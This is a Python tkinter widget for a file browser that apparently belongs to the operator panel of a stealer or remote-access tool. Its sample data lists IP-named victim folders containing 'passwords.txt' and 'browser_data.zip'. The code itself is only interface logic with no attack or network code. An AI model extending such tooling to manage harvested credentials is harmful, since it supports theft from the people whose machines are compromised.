"""
File manager widget for browsing client files
"""

import tkinter as tk
from tkinter import ttk
from typing import Dict, Any

class FileManagerWidget:
    """Widget for managing client files"""
    
    def __init__(self, parent, config: Dict[str, Any], backend_client):
        self.parent = parent
        self.config = config
        self.backend_client = backend_client
        
        self._create_interface()
    
    def _create_interface(self):
        """Create the file manager interface"""
        # Main container
        main_frame = ttk.Frame(self.parent)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        header_frame = ttk.Frame(main_frame, style='Card.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        title_label = ttk.Label(header_frame, 
                              text="📁 File Manager",
                              style='Header.TLabel')
        title_label.pack(side=tk.LEFT, padx=20, pady=15)
        
        # Path and controls
        controls_frame = ttk.Frame(header_frame)
        controls_frame.pack(side=tk.RIGHT, padx=20, pady=15)
        
        self.path_var = tk.StringVar(value="Clients/")
        path_label = ttk.Label(controls_frame, textvariable=self.path_var)
        path_label.pack(side=tk.LEFT, padx=(0, 10))
        
        back_button = ttk.Button(controls_frame,
                               text="← Back",
                               command=self._go_back)
        back_button.pack(side=tk.LEFT, padx=(0, 5))
        
        refresh_button = ttk.Button(controls_frame,
                                  text="Refresh",
                                  command=self._refresh_files)
        refresh_button.pack(side=tk.LEFT)
        
        # File tree
        tree_frame = ttk.Frame(main_frame, style='Card.TFrame')
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create treeview for files
        columns = ('Name', 'Type', 'Size', 'Modified')
        self.tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=15)
        
        # Configure columns
        self.tree.heading('Name', text='Name')
        self.tree.heading('Type', text='Type')
        self.tree.heading('Size', text='Size')
        self.tree.heading('Modified', text='Modified')
        
        self.tree.column('Name', width=300)
        self.tree.column('Type', width=100)
        self.tree.column('Size', width=100)
        self.tree.column('Modified', width=150)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        # Pack tree and scrollbar
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Bind double-click
        self.tree.bind('<Double-1>', self._on_double_click)
        
        # Add sample data
        self._add_sample_data()
    
    def _add_sample_data(self):
        """Add sample file data for demonstration"""
        sample_files = [
            {
                'name': '192_168_1_100',
                'type': 'Directory',
                'size': '--',
                'modified': '2024-01-15 10:30:00',
                'is_dir': True
            },
            {
                'name': '10_0_0_50',
                'type': 'Directory', 
                'size': '--',
                'modified': '2024-01-15 09:15:00',
                'is_dir': True
            }
        ]
        
        for file_item in sample_files:
            icon = "📁" if file_item['is_dir'] else "📄"
            self.tree.insert('', tk.END, values=(
                f"{icon} {file_item['name']}",
                file_item['type'],
                file_item['size'],
                file_item['modified']
            ))
    
    def _add_client_files_sample(self):
        """Add sample client files"""
        sample_files = [
            {
                'name': 'client_data_20240115_103000.zip',
                'type': 'ZIP Archive',
                'size': '2.5 MB',
                'modified': '2024-01-15 10:30:00',
                'is_dir': False
            },
            {
                'name': 'passwords.txt',
                'type': 'Text File',
                'size': '15.2 KB',
                'modified': '2024-01-15 10:30:15',
                'is_dir': False
            },
            {
                'name': 'browser_data.zip',
                'type': 'ZIP Archive',
                'size': '1.8 MB',
                'modified': '2024-01-15 10:31:00',
                'is_dir': False
            }
        ]
        
        for file_item in sample_files:
            icon = "📁" if file_item['is_dir'] else "📄"
            self.tree.insert('', tk.END, values=(
                f"{icon} {file_item['name']}",
                file_item['type'],
                file_item['size'],
                file_item['modified']
            ))
    
    def _on_double_click(self, event):
        """Handle double-click on file/directory"""
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            name = item['values'][0]
            
            # Remove icon from name
            if name.startswith("📁 ") or name.startswith("📄 "):
                name = name[2:]
            
            if item['values'][1] == 'Directory':
                # Navigate into directory
                current_path = self.path_var.get()
                new_path = f"{current_path}{name}/"
                self.path_var.set(new_path)
                
                # Clear and load new content
                for child in self.tree.get_children():
                    self.tree.delete(child)
                
                # Load directory content (sample data)
                if name.startswith(('192_168', '10_0_0')):
                    self._add_client_files_sample()
                else:
                    self._add_sample_data()
            else:
                # Open file (in real implementation, this would download/open the file)
                print(f"Opening file: {name}")
    
    def _go_back(self):
        """Navigate back to parent directory"""
        current_path = self.path_var.get()
        if current_path.count('/') > 1:  # Don't go above root
            # Remove last directory from path
            parts = current_path.rstrip('/').split('/')
            new_path = '/'.join(parts[:-1]) + '/'
            self.path_var.set(new_path)
            
            # Clear and load parent content
            for child in self.tree.get_children():
                self.tree.delete(child)
            
            self._add_sample_data()
    
    def _refresh_files(self):
        """Refresh the file list"""
        # Clear current items
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        # Reload based on current path
        current_path = self.path_var.get()
        if current_path == "Clients/":
            self._add_sample_data()
        else:
            self._add_client_files_sample()